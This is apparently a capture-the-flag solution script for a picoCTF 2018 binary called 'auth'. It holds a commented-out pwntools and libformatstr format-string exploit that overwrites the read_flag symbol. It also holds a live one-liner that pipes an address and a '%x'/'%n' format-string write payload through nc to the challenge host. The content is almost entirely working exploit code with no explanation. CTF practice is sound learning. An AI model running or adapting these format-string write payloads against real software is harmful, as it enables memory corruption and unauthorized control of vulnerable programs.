# from pwn import *
# from libformatstr import FormatStr

# p = process('./auth')
# elf = ELF('./auth')

# # gdb.attach(p,'''

# # break flag

# # ''')

# flag = elf.symbols['flag']
# read_flag = elf.symbols['read_flag']

# p.recvuntil('(yes/no)')

# f = FormatStr()
# f[read_flag] = flag
# offset = 11
# buf = ""
# buf += f.payload(offset,0)
# p.send(buf)
# print p.recv()
# p.interactive()

(python -c 'print "\x4c\xa0\x04\x08"+"%x"*9+"%x%n"') | nc 2018shell1.picoctf.com 27114